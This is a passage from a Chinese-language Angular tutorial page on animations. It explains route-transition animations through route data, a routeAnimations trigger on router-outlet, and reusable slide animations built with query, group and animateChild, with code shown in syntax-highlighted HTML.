          <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">,</span> offset<span class="token operator">:</span> <span class="token number">0.2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> offset<span class="token operator">:</span> <span class="token number">0.8</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; isRed'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'0.5s'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; *'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'5s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AnimationDemoComponent</span><span class="token punctuation">{</span>
  <span class="token keyword">public</span> isChange <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token function">handleChange</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isChange <span class="token operator">=</span> state<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><p>加了偏移以后，会清楚的发现，蓝色，红色的转场速度非常快，橙色相对较慢。</p> <h3 id="路由转场动画"><a href="#路由转场动画" class="header-anchor">#</a> 路由转场动画</h3> <p>在路由转换之间添加动画，可以有效的提高用户体验。下面我们来试试：</p> <h4 id="配置路由"><a href="#配置路由" class="header-anchor">#</a> 配置路由</h4> <p>在路由模块 PagesRoutingModule 中的 routes变量配置的每一个路由增加data属性，在data对象中增加animationName作为每一个路由的唯一标识。比如：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Routes<span class="token punctuation">,</span> RouterModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ParentComComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./parent-com/parent-com.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>FormsValidatorComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./forms-validator/forms-validator.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AsyncDemoComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./async-demo/async-demo.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>EditTableComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./edit-table/edit-table.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ModifyValidatorComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./modify-validator/modify-validator.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ReactiveFormValidatorComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./reactive-form-validator/reactive-form-validator.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>FormNestedComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./form-nested/form-nested.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>UserInfoComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./user-info/user-info.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ComplexAnimationsComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./complex-animations/complex-animations.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AnimationDemoComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./animation-demo/animation-demo.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>LifecycleHooksComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./lifecycle-hooks/lifecycle-hooks.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>StyleDemoComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./style-demo/style-demo.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>OperatingDOMComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./operating-dom/operating-dom.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>DynamicComComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./dynamic-com/dynamic-com.component'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> routes<span class="token operator">:</span> Routes <span class="token operator">=</span> <span class="token punctuation">[</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span> pathMatch<span class="token operator">:</span> <span class="token string">'full'</span><span class="token punctuation">,</span> redirectTo<span class="token operator">:</span> <span class="token string">'parentCom'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'parentCom'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> ParentComComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'parentCom'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'formsValidator'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> FormsValidatorComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'formsValidator'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'asyncDemo'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> AsyncDemoComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'asyncDemo'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'editTable'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> EditTableComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'editTable'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'modifyValidator'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> ModifyValidatorComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'modifyValidator'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'reactiveFormValidator'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> ReactiveFormValidatorComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'reactiveFormValidator'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'formNested'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> FormNestedComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'formNested'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'userInfo'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> UserInfoComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'userInfo'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'complexAnimations'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> ComplexAnimationsComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'complexAnimations'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'animationDemo'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> AnimationDemoComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'animationDemo'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'lifecycleHooks'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> LifecycleHooksComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'lifecycleHooks'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'styleDemo'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> StyleDemoComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'styleDemo'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'operatingDOM'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> OperatingDOMComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'operatingDOM'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'dynamicCom'</span><span class="token punctuation">,</span> component<span class="token operator">:</span> DynamicComComponent<span class="token punctuation">,</span> data<span class="token operator">:</span> <span class="token punctuation">{</span>animationName<span class="token operator">:</span> <span class="token string">'dynamicCom'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">{</span>path<span class="token operator">:</span> <span class="token string">'lazyLoad'</span><span class="token punctuation">,</span> loadChildren<span class="token operator">:</span> <span class="token string">'./lazy-load/lazy-load.module#LazyLoadModule'</span><span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
imports<span class="token operator">:</span> <span class="token punctuation">[</span>RouterModule<span class="token punctuation">.</span><span class="token function">forChild</span><span class="token punctuation">(</span>routes<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
exports<span class="token operator">:</span> <span class="token punctuation">[</span>RouterModule<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">PagesRoutingModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>这里的data属性中的animationName是任意的，可以根据需要设置不同的名称。目的是为了使用唯一性来触发动画。</p></div> <h4 id="路由出口router-outlet"><a href="#路由出口router-outlet" class="header-anchor">#</a> 路由出口router-outlet</h4> <p>在app.component.html中，是路由出口的DOM所在位置，先预定动画触发器的名称为‘routeAnimations’，即：trigger 为 'routeAnimations'。将这个触发器加载<code>&lt;router-outlet&gt;&lt;/router-outlet&gt;</code>的父级标签，即：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token punctuation">[</span>@routeAnimations<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;animationRoute(outletInfo)&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>router<span class="token operator">-</span>outlet #outletInfo<span class="token operator">=</span><span class="token string">&quot;outlet&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>outlet<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>在<code>&lt;router-outlet&gt;&lt;/router-outlet&gt;</code>容器中，使用outlet属性型指令，可以获得当前激活的路由及其状态的数据还有之前在路由中配置的data属性。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">animationRoute</span><span class="token punctuation">(</span><span class="token parameter">outlet<span class="token operator">:</span> RouterOutlet</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> outlet <span class="token operator">&amp;&amp;</span> outlet<span class="token punctuation">.</span>activatedRouteData <span class="token operator">&amp;&amp;</span> outlet<span class="token punctuation">.</span>activatedRouteData<span class="token punctuation">[</span><span class="token string">'animationName'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 使用不同animationName用来触发动画</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>方法animationRoute在视图发生变化调用，这个方法给触发器返回当前激活的路由的data中的animationName，以触发动画。</p> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>事实上，只要组件加载绑定dom的方法就会调用，此时获取的<code>outlet.activatedRouteData['animationName']</code>是不同的，增加<code>&amp;&amp;</code>是为了延迟获取。</p></div> <p><img src="/vuebloger/img/post/20191218082539282.png" alt=""></p> <h4 id="定义动画"><a href="#定义动画" class="header-anchor">#</a> 定义动画</h4> <p>由于这个动画可以是整个应用都可以使用的，可以复用，所以将其单独管理。在src目录下新建目录animations。在 animations 目录下新建ts文件：animation-route.ts，内容为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>animate<span class="token punctuation">,</span> animateChild<span class="token punctuation">,</span> group<span class="token punctuation">,</span> query<span class="token punctuation">,</span> style<span class="token punctuation">,</span> transition<span class="token punctuation">,</span> trigger<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> AnimationRoute <span class="token operator">=</span>
<span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'routeAnimations'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
<span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* &lt;=&gt; *'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token comment">// 只要有变化就会触发，定义不同animationName就是为了产生变化</span>
  <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>position<span class="token operator">:</span> <span class="token string">'relative'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter, :leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      position<span class="token operator">:</span> <span class="token string">'absolute'</span><span class="token punctuation">,</span>
      top<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
      left<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
      width<span class="token operator">:</span> <span class="token string">'100%'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>optional<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 初始化进入/划出页面位置在视区</span>
  <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>left<span class="token operator">:</span> <span class="token string">'-100%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>optional<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 进入页面放在视区左</span>
  <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token function">animateChild</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>optional<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 划出页面子元素启用动画</span>
  <span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'200ms ease-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>left<span class="token operator">:</span> <span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 划出页面从当前视区划出</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>optional<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'300ms ease-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>left<span class="token operator">:</span> <span class="token string">'0%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 进入页面从左侧进入当前视区</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>optional<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token function">animateChild</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>optional<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 进入页面子元素启用动画</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>因为 这里所有的路由对应的每一个组件的转场动画都是一致的，所以状态转化标准为：* &lt;=&gt; *。</p> <p>因为动画绑定在父级。这里使用 query()方法可以找出当前宿主组件中的动画元素。query(&quot;:enter&quot;)返回已插入的视图，query(&quot;:leave&quot;)返回已移除的视图。</p> <p>这里使用 group()函数来并行运行内部动画，在 group()函数中，查询已移除的视图，并让它从右侧滑出。</p> <p>当主动画完成之后，在这个新视图上调用 animateChild()方法，以运行其子动画。</p> <div class="custom-block tip"><p class="custom-block-title">需要注意</p> <p>这里需要加上{optional: true},设置query()查询是可选的，否则在查询不到的情况下会报错。</p></div> <h4 id="将动画与组件关联"><a href="#将动画与组件关联" class="header-anchor">#</a> 将动画与组件关联</h4> <p>修改 app.component.ts 的元数据 的animations属性</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
templateUrl<span class="token operator">:</span> <span class="token string">'./app.component.html'</span><span class="token punctuation">,</span>
styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./app.component.less'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
animations<span class="token operator">:</span> <span class="token punctuation">[</span>AnimationRoute<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>这样所有路由都会有从右往左滑动的效果了。</p> <h3 id="给组件绑定动画"><a href="#给组件绑定动画" class="header-anchor">#</a> 给组件绑定动画</h3> <p>我们看下一个新的实例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> trigger<span class="token punctuation">,</span> state<span class="token punctuation">,</span> transition<span class="token punctuation">,</span> style<span class="token punctuation">,</span> animate<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> slideToRight <span class="token operator">=</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'routeAnim'</span><span class="token punctuation">,</span><span class="token punctuation">[</span>
    <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'void'</span><span class="token punctuation">,</span><span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'position'</span><span class="token operator">:</span><span class="token string">'fixed'</span><span class="token punctuation">,</span><span class="token string">'width'</span><span class="token operator">:</span><span class="token string">'100%'</span><span class="token punctuation">,</span><span class="token string">'height'</span><span class="token operator">:</span><span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'position'</span><span class="token operator">:</span><span class="token string">'fixed'</span><span class="token punctuation">,</span><span class="token string">'width'</span><span class="token operator">:</span><span class="token string">'100%'</span><span class="token punctuation">,</span><span class="token string">'height'</span><span class="token operator">:</span><span class="token string">'80%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'void =&gt; *'</span><span class="token punctuation">,</span><span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(-100%)'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'.5s ease-in-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(0)'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; void'</span><span class="token punctuation">,</span><span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(0)'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'.5s ease-in-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(100%)'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>在project-list,task-home中使用路由动画。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// project-list</span>
<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-project-list&quot;</span><span class="token punctuation">,</span>
